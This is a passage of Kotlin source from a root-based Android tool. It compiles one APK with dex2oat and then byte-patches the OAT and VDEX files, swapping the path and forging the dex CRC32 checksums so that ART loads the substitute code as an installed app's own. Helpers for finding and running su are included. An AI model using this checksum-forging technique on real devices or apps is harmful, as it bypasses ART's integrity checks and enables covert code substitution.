            moveAttempted = moveAttempted,
            moveApplied = moveApplied,
            movedOdexPath = movedOdexPath,
            movedVdexPath = movedVdexPath,
            moveDetail = moveDetail,
        )
    }

    // ────────────────────────────── OAT byte-patching ──────────────────────────────

    private data class PatchResult(
        val patchCount: Int,
        val applied: Boolean,
        val detail: String,
        val perDexDetails: List<String>,
    )

    /**
     * Multi-dex-aware OAT patch. Each classesN.dex in the source APK generates its own
     * OatDexFileHeader inside the OAT, and each header's `dex_file_location_data` is
     * something like `<workingPath>!classesN.dex` (main dex has bare `<workingPath>`).
     *
     * We iterate ALL occurrences of workingPath in the OAT bytes, detect the
     * `!classesN.dex` suffix (if any) to identify the entry, overwrite the path with
     * targetPath (same length, no shift), and overwrite the 4-byte checksum that
     * follows the full location string with the corresponding classesN.dex CRC32
     * pulled from the INSTALLED target APK — the value ART will compare against at
     * load time.
     */
    private fun patchOatMultiDex(
         oat: File,
        workingPath: String,
        targetPath: String,
        pickedApkCrcs: Map<String, Long>,
        installedApkCrcs: Map<String, Long>,
    ): PatchResult {
        if (workingPath.length != targetPath.length) {
            return PatchResult(0, false, "path lengths differ (${workingPath.length} vs ${targetPath.length}) — refusing to patch", emptyList())
        }
        return try {
            vlog(TAG, "  [OAT patch] reading ${oat.length()} bytes from ${oat.absolutePath}")
            val bytes = oat.readBytes()
            val needle = workingPath.toByteArray(Charsets.US_ASCII)
            vlog(TAG, "  [OAT patch] searching for working path (${needle.size} bytes) in OAT")
            val targetBytes = targetPath.toByteArray(Charsets.US_ASCII)
            val details = mutableListOf<String>()
            val skipped = mutableListOf<String>()
            var searchFrom = 0

            var matchNum = 0
            while (true) {
                val idx = indexOfBytes(bytes, needle, searchFrom)
                if (idx < 0) break
                matchNum++

                vlog(TAG, "  ┌─ [OAT] match #$matchNum: found working-path bytes at offset 0x%x (%d)".format(idx, idx))

                // Positive identification via the uint32 dex_file_location_size prefix
                // that lives 4 bytes BEFORE the path (PDF p. 8). If this value equals
                // workingPath.length, it's the main classes.dex entry; if it equals
                // workingPath.length + "!classesN.dex".length, it's a secondary entry;
                // anything else is a stray occurrence (e.g. in key_value_store which
                // embeds the dex2oat command line).
                if (idx < 4) {
                    vlog(TAG, "  └─ skip: match too near start of file to have a size prefix")
                    searchFrom = idx + 1
                    continue
                }
                val sizeBefore = uint32LE(bytes, idx - 4).toInt()
                vlog(TAG, "  │   the 4 bytes BEFORE the path (the size field) = $sizeBefore")
                vlog(TAG, "  │   raw size bytes @ 0x%x: %s".format(idx - 4, hex(bytes, idx - 4, 4)))
                vlog(TAG, "  │   working path length = ${workingPath.length}")
                vlog(TAG, "  │   → is this a real dex_file_location entry? (size must == ${workingPath.length}, or ${workingPath.length}+!classesN.dex)")

                val dexName: String
                val fullLocationLen: Int

                when {
                    sizeBefore == workingPath.length -> {
                        // Main dex — bare path, no bang suffix.
                        dexName = "classes.dex"
                        fullLocationLen = workingPath.length
                        vlog(TAG, "  │   ✓ size == ${workingPath.length} → REAL entry, this is the MAIN classes.dex")
                    }
                    sizeBefore in (workingPath.length + 2)..(workingPath.length + 32) -> {
                        val suffixLen = sizeBefore - workingPath.length
                        if (idx + workingPath.length + suffixLen > bytes.size) {
                            vlog(TAG, "  └─ skip: suffix would run past end of file")
                            searchFrom = idx + 1; continue
                        }
                        val suffixStr = String(bytes, idx + workingPath.length, suffixLen, Charsets.US_ASCII)
                        if (suffixStr.matches(Regex("^!classes\\d*\\.dex$"))) {
                            dexName = suffixStr.substring(1)
                            fullLocationLen = sizeBefore
                            vlog(TAG, "  │   ✓ size == ${workingPath.length}+$suffixLen and suffix='$suffixStr' → REAL entry for $dexName")
                        } else {
                            vlog(TAG, "  └─ ✗ FALSE POSITIVE: size=$sizeBefore but suffix='$suffixStr' isn't !classesN.dex (skipped)")
                            skipped.add("false-positive @ 0x%x (size=%d, suffix='%s')".format(idx, sizeBefore, suffixStr))
                            searchFrom = idx + 1
                            continue
                        }
                    }
                    else -> {
                        // Not a dex_file_location entry (e.g. the command line stored in key_value_store).
                        vlog(TAG, "  └─ ✗ FALSE POSITIVE: size=$sizeBefore matches no classesN.dex — this is the path")
                        vlog(TAG, "         appearing inside the key_value_store command line, NOT a real header. (skipped)")
                        skipped.add("false-positive @ 0x%x (size prefix=%d does not match any classesN.dex)".format(idx, sizeBefore))
                        searchFrom = idx + 1
                        continue
                    }
                }

                vlog(TAG, "  │")
                vlog(TAG, "  │   PATCHING $dexName:")
                vlog(TAG, "  │   path  BEFORE @ 0x%x: '%s'".format(idx, String(bytes, idx, fullLocationLen, Charsets.US_ASCII)))

                // Overwrite the path prefix with the target path (same length, no shift).
                System.arraycopy(targetBytes, 0, bytes, idx, targetBytes.size)
                vlog(TAG, "  │   path  AFTER  @ 0x%x: '%s'".format(idx, String(bytes, idx, fullLocationLen, Charsets.US_ASCII)))

                // ---- PATCH THE CHECKSUM (search-based, like the VDEX patch) ----
                // The dex_file_location_checksum sits a few bytes after the location string,
                // but the exact gap depends on the OAT format: older formats put the CRC
                // right after the path; modern formats (Android 16+) insert the 8-byte DEX
                // magic "dex\n035\0" first, then the CRC, then a 20-byte SHA-1. Rather than
                // hardcode that gap, we SEARCH for this dex's picked CRC32 (the value dex2oat
                // just wrote) in a small window right after the location string and overwrite
                // the first occurrence with the installed CRC. The DEX magic can never equal
                // a CRC, so the first match after the path is always the real checksum field.
                val pickedCrc = pickedApkCrcs[dexName]
                val installedCrc = installedApkCrcs[dexName]
                val searchStart = idx + fullLocationLen
                val searchEnd = minOf(searchStart + 64, bytes.size)
                if (pickedCrc != null && installedCrc != null) {
                    val pickedPattern = byteArrayOf(
                        (pickedCrc and 0xFF).toByte(),
                        ((pickedCrc shr 8) and 0xFF).toByte(),
                        ((pickedCrc shr 16) and 0xFF).toByte(),
                        ((pickedCrc shr 24) and 0xFF).toByte(),
                    )
                    val checksumOff = indexOfBytes(bytes, pickedPattern, searchStart)
                    if (checksumOff in searchStart until searchEnd) {
                        vlog(TAG, "  │   checksum found @ 0x%x (searched picked CRC 0x%08x, gap=%d bytes after path)".format(checksumOff, pickedCrc, checksumOff - searchStart))
                        bytes[checksumOff] = (installedCrc and 0xFF).toByte()
                        bytes[checksumOff + 1] = ((installedCrc shr 8) and 0xFF).toByte()
                        bytes[checksumOff + 2] = ((installedCrc shr 16) and 0xFF).toByte()
                        bytes[checksumOff + 3] = ((installedCrc shr 24) and 0xFF).toByte()
                        vlog(TAG, "  │   checksum AFTER  @ 0x%x: %s (= 0x%08x  ← installed %s CRC)".format(checksumOff, hex(bytes, checksumOff, 4), installedCrc, dexName))
                        vlog(TAG, "  └─ ✓ patched $dexName (path swapped, CRC written)")
                        details.add("%s @ 0x%x, size=%d, checksum @ 0x%x, CRC 0x%08x".format(dexName, idx, fullLocationLen, checksumOff, installedCrc))
                    } else {
                        Log.w(TAG, "  └─ ⚠ picked CRC 0x%08x not found within 64 bytes after location for $dexName — checksum NOT patched".format(pickedCrc))
                        details.add("%s @ 0x%x, size=%d — path patched, checksum NOT found (picked CRC 0x%08x)".format(dexName, idx, fullLocationLen, pickedCrc))
                    }
                } else {
                    Log.w(TAG, "  └─ ⚠ missing picked/installed CRC for $dexName — checksum not patched")
                    details.add("%s @ 0x%x, size=%d — missing CRC for $dexName".format(dexName, idx, fullLocationLen))
                }
                searchFrom = idx + fullLocationLen
            }
            vlog(TAG, "  [OAT patch] scanned all matches: ${details.size} real entries patched, ${skipped.size} false positives skipped")

            if (details.isEmpty()) {
                PatchResult(0, false, "no valid dex_file_location entries found; ${skipped.size} strays skipped", skipped)
            } else {
                oat.writeBytes(bytes)
                val summary = "patched ${details.size} dex_file_location entries" +
                    if (skipped.isNotEmpty()) "; ${skipped.size} false-positives skipped" else ""
                PatchResult(details.size, true, summary, details + skipped)
            }
        } catch (t: Throwable) {
            vlog(TAG, t.message.toString());
            PatchResult(0, false, "patch error: ${t.message}", emptyList())
        }
    }

    private fun uint32LE(bytes: ByteArray, offset: Int): Long =
        (bytes[offset].toLong() and 0xFF) or
            ((bytes[offset + 1].toLong() and 0xFF) shl 8) or
            ((bytes[offset + 2].toLong() and 0xFF) shl 16) or
            ((bytes[offset + 3].toLong() and 0xFF) shl 24)

    /** Pretty-print [len] bytes from [bytes] at [off] as space-separated hex, for logs. */
    private fun hex(bytes: ByteArray, off: Int, len: Int): String {
        val end = minOf(off + len, bytes.size)
        if (off < 0 || off >= bytes.size) return "<out of range>"
        val sb = StringBuilder()
        for (i in off until end) {
            sb.append("%02x ".format(bytes[i].toInt() and 0xFF))
        }
        return sb.toString().trim()
    }

    /**
     * VDEX header carries its own dex_checksums array — ART cross-checks it against
     * the OAT's dex_file_location_checksum values, and if they disagree the whole
     * OAT is rejected.
     *
     * VDEX layout has changed several times (v019 → v027+). The checksum array's
     * offset differs by version:
     *   v019-v020ish: offset 20 (as older offset-based tools hardcode)
     *   v027+ (Android 15/16): offset 0x3c, stored in a header pointer at byte 0x10
     *
     * Instead of tracking every version's layout, we do a version-agnostic patch:
     * dex2oat just wrote the picked APK's 6 CRC32s consecutively into the VDEX at
     * whatever offset the format uses. We search for that exact 24-byte sequence
     * and replace it with the installed APK's CRC32s. First match, before any DEX
     * data starts — no chance of hitting a false positive in embedded DEX bytes.
     */
    private fun patchVdexChecksums(
        vdex: File,
        pickedApkCrcs: Map<String, Long>,
        installedApkCrcs: Map<String, Long>,
    ): PatchResult {
        return try {
            vlog(TAG, "  [VDEX patch] reading ${vdex.length()} bytes from ${vdex.absolutePath}")
            val bytes = vdex.readBytes()
            if (bytes.size < 24) return PatchResult(0, false, "VDEX too small (${bytes.size} bytes)", emptyList())
            val version = try {
                String(bytes, 4, 3, Charsets.US_ASCII).trim().toInt()
            } catch (t: Throwable) {
                vlog(TAG, t.message.toString())
                -1
            }
            vlog(TAG, "  [VDEX patch] version = $version (from bytes 4-6)")

            // Sort dex entries in natural order: classes.dex, classes2.dex, ..., classesN.dex.
            val sortedNames = installedApkCrcs.keys.sortedBy { name ->
                if (name == "classes.dex") 0
                else name.removePrefix("classes").removeSuffix(".dex").toIntOrNull() ?: 999
            }
            if (sortedNames.isEmpty()) return PatchResult(0, false, "no CRCs to patch", emptyList())
            vlog(TAG, "  [VDEX patch] sorted dex order: ${sortedNames.joinToString()}")

            // Build the exact 4*N-byte pattern dex2oat wrote — the PICKED APK's CRCs in natural order.
            val expected = ByteArray(sortedNames.size * 4)
            sortedNames.forEachIndexed { i, name ->
                val crc = pickedApkCrcs[name] ?: 0L
                expected[i * 4]     = (crc and 0xFF).toByte()
                expected[i * 4 + 1] = ((crc shr 8) and 0xFF).toByte()
                expected[i * 4 + 2] = ((crc shr 16) and 0xFF).toByte()
                expected[i * 4 + 3] = ((crc shr 24) and 0xFF).toByte()
            }
            vlog(TAG, "  [VDEX patch] search pattern: ${expected.size} bytes = ${sortedNames.size} × CRC32")
            vlog(TAG, "                              (picked APK CRCs in natural dex order)")
            vlog(TAG, "  [VDEX patch] pattern bytes: ${hex(expected, 0, expected.size)}")
            sortedNames.forEachIndexed { i, name ->
                vlog(TAG, "                slot $i = $name picked-CRC 0x%08x".format(pickedApkCrcs[name] ?: 0L))
            }

            // Search for it — first match wins (VDEX header comes before embedded DEX data).
            val idx = indexOfBytes(bytes, expected)
            if (idx < 0) {
                Log.e(TAG, "  [VDEX patch] pattern NOT FOUND — pipeline will fail")
                return PatchResult(
                    0, false,
                    "VDEX v$version: picked APK's CRC sequence not found consecutively — did dex2oat compile the picked APK?",
                    emptyList(),
                )
            }
            vlog(TAG, "  [VDEX patch] pattern found at offset 0x%x (%d) — this is where the checksums array lives".format(idx, idx))
            vlog(TAG, "  [VDEX patch] BEFORE (whole array): ${hex(bytes, idx, sortedNames.size * 4)}")

            // Overwrite each 4-byte slot with the installed APK's CRC for the corresponding dex.
            val details = mutableListOf<String>()
            sortedNames.forEachIndexed { i, name ->
                val crc = installedApkCrcs[name] ?: return@forEachIndexed
                val off = idx + i * 4
                vlog(TAG, "  ┌─ [VDEX] slot $i ($name) @ 0x%x".format(off))
                vlog(TAG, "  │   BEFORE: %s (= 0x%08x  ← picked-APK CRC dex2oat wrote)".format(hex(bytes, off, 4), uint32LE(bytes, off)))
                bytes[off]     = (crc and 0xFF).toByte()
                bytes[off + 1] = ((crc shr 8) and 0xFF).toByte()
                bytes[off + 2] = ((crc shr 16) and 0xFF).toByte()
                bytes[off + 3] = ((crc shr 24) and 0xFF).toByte()
                vlog(TAG, "  └─ AFTER : %s (= 0x%08x  ← installed-APK CRC, what ART expects)".format(hex(bytes, off, 4), crc))
                details.add("$name @ 0x%x, CRC 0x%08x".format(off, crc))
            }
            vlog(TAG, "  [VDEX patch] AFTER  (whole array): ${hex(bytes, idx, sortedNames.size * 4)}")

            vdex.writeBytes(bytes)
            PatchResult(
                details.size, true,
                "patched VDEX v$version — ${details.size} CRCs at offset 0x%x (detected)".format(idx),
                details,
            )
        } catch (t: Throwable) {
            vlog(TAG, t.message.toString());
            PatchResult(0, false, "VDEX patch error: ${t.message}", emptyList())
        }
    }

    private fun indexOfBytes(haystack: ByteArray, needle: ByteArray, from: Int = 0): Int {
        if (needle.isEmpty() || haystack.size < needle.size) return -1
        val start = maxOf(0, from)
        outer@ for (i in start..haystack.size - needle.size) {
            for (j in needle.indices) {
                if (haystack[i + j] != needle[j]) continue@outer
            }
            return i
        }
        return -1
    }

    // ────────────────────────────── APK / DEX helpers ──────────────────────────────

    private fun computeDexCrc32(apkFile: File): Long = try {
        ZipFile(apkFile).use { zip ->
            val entry = zip.getEntry("classes.dex") ?: return -1L
            val crc = CRC32()
            zip.getInputStream(entry).use { input ->
                val buf = ByteArray(64 * 1024)
                while (true) {
                    val n = input.read(buf)
                    if (n <= 0) break
                    crc.update(buf, 0, n)
                }
            }
            crc.value
        }
    } catch (t: Throwable) {
        vlog(TAG, t.message.toString());
        -1L
    }

    /** Reads CRC32 for every `classesN.dex` entry directly from the APK's central directory. */
    private fun computeAllDexCrcs(apkFile: File): Map<String, Long> {
        val out = mutableMapOf<String, Long>()
        return try {
            ZipFile(apkFile).use { zip ->
                zip.entries().toList().forEach { entry ->
                    if (entry.name.matches(Regex("^classes\\d*\\.dex$"))) {
                        // ZipEntry.crc is stored in the central directory — no re-hash needed.
                        out[entry.name] = entry.crc
                    }
                }
            }
            out
        } catch (t: Throwable) {
            vlog(TAG, t.message.toString());
            out
        }
    }

// ────────────────────────────── system / arch ──────────────────────────────

    /**
     * Resolves the dex2oat binary. Since API 30 (Android 11) `dex2oat` ships in the
     * ART APEX at `/apex/com.android.art/bin/dex2oat`; older paths remain as
     * fallbacks. We probe via `command -v` under su so we honour whatever PATH the
     * root shell exposes, then fall back to explicit apex/system locations.
     */
    private fun resolveDex2OatPath(): String {
        val (exit, out, _) = runAsRoot(listOf("sh", "-c", "command -v dex2oat"))
        val fromPath = out.trim().lines().firstOrNull()?.takeIf { it.isNotBlank() && exit == 0 }
        if (fromPath != null) return fromPath
        val candidates = listOf(
            "/apex/com.android.art/bin/dex2oat",       // API 30+
            "/apex/com.android.art/bin/dex2oat64",     // API 30+ (64-bit build)
            "/apex/com.android.runtime/bin/dex2oat",   // API 29 transitional apex
            "/system/bin/dex2oat",                     // legacy
        )
        for (c in candidates) {
            val (e, _, _) = runAsRoot(listOf("test", "-x", c))
            if (e == 0) return c
        }
        return "dex2oat"
    }

    private fun buildDex2OatCommand(apkPath: String, oatPath: String, isa: String, clc: String): List<String> = listOf(
        resolveDex2OatPath(),
        "--dex-file=$apkPath",
        "--oat-file=$oatPath",
        "--class-loader-context=$clc",
        "--instruction-set=$isa",


    )

    private fun currentInstructionSet(): String {
        val abi = android.os.Build.SUPPORTED_ABIS.firstOrNull() ?: "unknown"
        return when {
            abi.startsWith("arm64") -> "arm64"
            abi.startsWith("armeabi") -> "arm"
            abi == "x86_64" -> "x86_64"
            abi == "x86" -> "x86"
            else -> abi
        }
    }

    private val SU_CANDIDATES = listOf("su", "/system/bin/su", "/system/xbin/su", "/su/bin/su")

    private fun hasRoot(): Boolean = SU_CANDIDATES.any { candidate ->
        try {
            val p = ProcessBuilder(candidate, "-c", "id").redirectErrorStream(true).start()
            val out = p.inputStream.bufferedReader().readText()
            p.waitFor()
            out.contains("uid=0")
        } catch (t: Throwable) {
            vlog(TAG, t.message.toString());
            false
        }
    }

    private fun runAsRoot(command: List<String>): Triple<Int, String, String> {
        val quoted = command.joinToString(" ") { arg -> "'" + arg.replace("'", "'\\''") + "'" }
        for (su in SU_CANDIDATES) {
            try {
                val process = ProcessBuilder(su, "-c", quoted).start()
                val stdout = readAll(process.inputStream)
                val stderr = readAll(process.errorStream)
                val exit = process.waitFor()
                return Triple(exit, stdout, stderr)
            } catch (t: Throwable) {
                vlog(TAG, t.message.toString())
            }
        }
        return Triple(-1, "", "no su binary could execute the command")
    }

    private fun readAll(stream: java.io.InputStream): String = try {
        BufferedReader(InputStreamReader(stream)).use { it.readText() }
    } catch (t: Throwable) {
        vlog(TAG, t.message.toString());
        ""
    }

    private fun errored(source: String, detail: String) = RunResult(
        sourceApkPath = source,
        rootAvailable = false, command = emptyList(), exitCode = -1,
        stdout = "", stderr = "",
        outDexPath = "", outOatPath = "",
        outOatExists = false, outOatSizeBytes = 0, instructionSet = currentInstructionSet(),
        classLoaderContext = FALLBACK_CLC,
        classLoaderContextSource = "not resolved (pipeline errored early)",
        detail = detail,
        originalDexCrc32 = -1L, targetInstallPath = "", workingDexPath = "",
        installedDexCrcs = emptyMap(),
        pathsLengthMatch = false, patchCount = 0, patchApplied = false,
        patchDetail = "not attempted", patchPerDex = emptyList(),
        vdexPatchCount = 0, vdexPatchApplied = false, vdexPatchDetail = "not attempted",
        vdexPatchPerDex = emptyList(),
        permissionsApplied = false, permissionsDetail = "not attempted",
        moveAttempted = false, moveApplied = false,
        movedOdexPath = "", movedVdexPath = "",
        moveDetail = "not attempted",
    )
}
